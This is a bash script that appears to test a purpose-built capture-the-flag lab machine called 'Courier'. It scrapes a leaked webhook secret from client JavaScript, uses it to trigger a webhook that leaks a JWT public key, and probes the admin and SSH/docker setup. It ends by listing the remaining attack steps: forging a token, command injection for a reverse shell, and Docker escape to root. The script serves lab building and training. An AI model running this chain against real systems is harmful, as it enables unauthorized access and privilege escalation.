#!/bin/bash

# Quick test script for Courier HTB Machine
# Usage: ./test_attack.sh [TARGET_IP] [ATTACKER_IP]

TARGET_IP="${1:-localhost}"
ATTACKER_IP="${2:-10.10.14.5}"

echo "=========================================="
echo "Courier HTB Machine - Attack Chain Test"
echo "=========================================="
echo ""
echo "Target: $TARGET_IP"
echo "Attacker: $ATTACKER_IP"
echo ""

# Colors
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Step 1: Check if web app is running
echo "[1/5] Checking if web app is running..."
if curl -s -o /dev/null -w "%{http_code}" http://$TARGET_IP:3000 | grep -q "200"; then
    echo -e "${GREEN}[+] Web app is running${NC}"
else
    echo -e "${RED}[-] Web app is not responding${NC}"
    echo "    Run: sudo systemctl status courier-web"
    exit 1
fi

# Step 2: Discover webhook secret
echo ""
echo "[2/5] Testing webhook secret leak..."
SECRET=$(curl -s http://$TARGET_IP:3000/main.js 2>/dev/null | grep -oP "WEBHOOK_SECRET = '\K[^']+" || echo "")
if [ -z "$SECRET" ]; then
    echo -e "${RED}[-] Failed to find webhook secret${NC}"
    echo "    Try: curl http://$TARGET_IP:3000/main.js | grep WEBHOOK_SECRET"
    exit 1
fi
echo -e "${GREEN}[+] Found webhook secret: $SECRET${NC}"

# Step 3: Trigger webhook
echo ""
echo "[3/5] Testing webhook trigger..."
RESPONSE=$(curl -s -X POST http://$TARGET_IP:3000/webhook/trigger \
  -H "Content-Type: application/json" \
  -d "{\"secret\": \"$SECRET\", \"event\": \"push\", \"repository\": {\"name\": \"internal-app\"}}")

if echo "$RESPONSE" | grep -q "publicKey"; then
    echo -e "${GREEN}[+] Webhook triggered successfully${NC}"
    echo -e "${GREEN}[+] Public key leaked in logs${NC}"
    
    # Extract public key
    echo "$RESPONSE" | grep -oP '"publicKey":\s*"[^"]*"' | head -1 | cut -d'"' -f4 > /tmp/public_key.pem 2>/dev/null || true
    if [ -f /tmp/public_key.pem ] && [ -s /tmp/public_key.pem ]; then
        echo -e "${GREEN}[+] Public key saved to /tmp/public_key.pem${NC}"
    fi
else
    echo -e "${YELLOW}[-] Webhook response unexpected${NC}"
    echo "    Response: $RESPONSE"
fi

# Step 4: Check admin endpoint (without auth - should fail)
echo ""
echo "[4/5] Testing admin endpoint protection..."
ADMIN_TEST=$(curl -s -X GET http://$TARGET_IP:3000/admin/status)
if echo "$ADMIN_TEST" | grep -q "token\|Unauthorized\|401"; then
    echo -e "${GREEN}[+] Admin endpoint is protected${NC}"
else
    echo -e "${RED}[-] Admin endpoint may not be protected!${NC}"
fi

# Step 5: Check if runner user exists and is in docker group
echo ""
echo "[5/5] Testing system configuration..."
if ssh -o ConnectTimeout=2 -o StrictHostKeyChecking=no runner@$TARGET_IP "groups" 2>/dev/null | grep -q "docker"; then
    echo -e "${GREEN}[+] Runner user exists and is in docker group${NC}"
elif [ "$TARGET_IP" = "localhost" ] || [ "$TARGET_IP" = "127.0.0.1" ]; then
    if id runner 2>/dev/null | grep -q "docker"; then
        echo -e "${GREEN}[+] Runner user exists and is in docker group${NC}"
    else
        echo -e "${YELLOW}[-] Cannot verify runner user (testing locally)${NC}"
    fi
else
    echo -e "${YELLOW}[-] Cannot verify runner user (SSH not configured)${NC}"
    echo "    This is expected - verify manually after getting shell"
fi

echo ""
echo "=========================================="
echo "Basic Tests Complete"
echo "=========================================="
echo ""
echo "Next steps:"
echo "1. Forge JWT token using the leaked public key"
echo "2. Use forged token to access /admin/build endpoint"
echo "3. Inject command to get reverse shell"
echo "4. Escape Docker container to get root"
echo ""
echo "See TESTING.md for detailed instructions"
echo ""

